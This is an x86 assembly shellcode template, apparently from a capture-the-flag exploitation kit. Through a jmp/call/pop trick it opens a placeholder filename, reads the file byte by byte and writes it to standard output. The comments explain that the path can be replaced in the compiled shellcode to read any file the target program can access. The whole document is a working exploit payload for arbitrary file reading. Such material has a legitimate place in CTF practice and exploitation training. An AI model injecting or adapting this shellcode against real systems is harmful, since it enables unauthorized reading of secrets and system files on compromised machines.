[SECTION .text]

global _start

; entrypoint
_start:
    ; clear registers, mostly because we're using them
    ; in syscalls as parameters 
    xor     eax, eax
    xor     ebx, ebx
    xor     ecx, ecx
    xor     edx, edx

    ; jump to end of code where filename resides
    jmp     stub

openf:
    ; pop ebx to place the location of flag.txt
    ; into that specific register, used for
    ; sys_open. This works because the 'flag.txt'
    ; string is the return address of openf
    <POP_ARCH>

    ; call sys_open (5)
    mov     al, byte 5      ; syscall 5, open
    xor     ecx, ecx
    int     0x80

    ; move the file descriptor (eax) in esi and read
    mov     esi, eax
    jmp     readloop

readloop:
    ; move the file descriptor in ebx for sys_read (3)
    mov     ebx, esi
    mov     al, byte 3      ; syscall 3, read
    sub     esp, 1          ; reserve memory on stack for read byte
    lea     ecx, [esp]      ; load effective address of that memory
    mov     dl, byte 1      ; read count, 1 byte
    int     0x80            ; call read

    ; if num read bytes = 0, exit
    xor     ebx, ebx
    cmp     ebx, eax
    je      exit

    ; write byte to fd 1 (stdout) using syscall 4, write
    ; the address of data is still in ecx
    mov     al, 4           ; syscall 4, write
    mov     bl, 1           ; file descriptor 1, stdout
    mov     dl, 1           ; write count, 1 byte
    int     0x80            ; call write (4)

    ; clear byte and continue
    add     esp, 1
    jmp     readloop

exit:
    ; terminate application using exit syscall (1)
    mov     al, byte 1
    xor     edx, edx
    int     0x80            ; call exit (1)

stub:
    ; call the routine that opens and reads the flag
    call    openf

    ; place any file(path|name) here that is accessible from the
    ; target program. You can also replace this value in the resulting
    ; shell code later, to be able to read any file. This data is added as
    ; instructions, but is unreachable by our code but we can get its
    ; address by popping a register it needs to be placed in
    db      '<FILENAME>'